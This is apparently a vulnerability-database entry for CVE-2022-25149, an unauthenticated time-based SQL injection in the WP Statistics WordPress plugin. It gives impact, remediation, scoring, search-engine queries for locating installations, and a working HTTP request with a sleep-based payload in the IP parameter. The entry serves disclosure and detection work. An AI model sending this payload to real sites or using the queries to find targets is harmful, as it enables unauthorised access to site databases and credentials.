---
layout: "post"
cve_id: "CVE-2022-25149"
title: "WordPress Plugin WP Statistics <= 13.1.5 - SQL Injection"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-25149.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-25149.yaml"
author: "theamanrawat"
severity: "high"
impact: "Unauthenticated attackers can execute time-based blind SQL injection through the IP parameter to extract sensitive database information including user credentials, posts, comments, and WordPress configuration data.
"
remediation: "Update WP Statistics plugin to version 13.1.6 or later that properly escapes and parameterizes the IP parameter.
"
reference:
  - "https://wordpress.org/plugins/wp-statistics/"
  - "https://gist.github.com/Xib3rR4dAr/5dbd58b7f57a5037fe461fba8e696042"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-25149"
  - "https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2679983%40wp-statistics&new=2679983%40wp-statistics&sfp_email=&sfph_mail="
  - "https://www.wordfence.com/vulnerability-advisories/#CVE-2022-25149"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2022-25149', 'cwe-id': 'CWE-89', 'epss-score': 0.73381, 'epss-percentile': 0.9875, 'cpe': 'cpe:2.3:a:veronalabs:wp_statistics:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 2, 'vendor': 'veronalabs', 'product': 'wp_statistics', 'framework': 'wordpress', 'shodan-query': 'http.html:/wp-content/plugins/wp-statistics/', 'fofa-query': 'body=/wp-content/plugins/wp-statistics/', 'publicwww-query': '/wp-content/plugins/wp-statistics/', 'google-query': 'inurl:/wp-content/plugins/wp-statistics'}"
tags:
  - "time-based-sqli"
  - "cve2022"
  - "cve"
  - "sqli"
  - "wpscan"
  - "wordpress"
  - "wp-plugin"
  - "wp"
  - "wp-statistics"
  - "veronalabs"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
The WP Statistics WordPress plugin is vulnerable to SQL Injection due to insufficient escaping and parameterization of the IP parameter found in the ~/includes/class-wp-statistics-hits.php file which allows attackers without authentication to inject arbitrary SQL queries to obtain sensitive information, in versions up to and including 13.1.5.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /wp-json/wp-statistics/v2/hit?_=11&_wpnonce=hiEKVT&wp_statistics_hit_rest&browser&platform&version&referred&ip='-sleep(6)-'&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id=0&search_query&page_uri=/&user_id=0 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Connection: close
Accept-Encoding: gzip
```

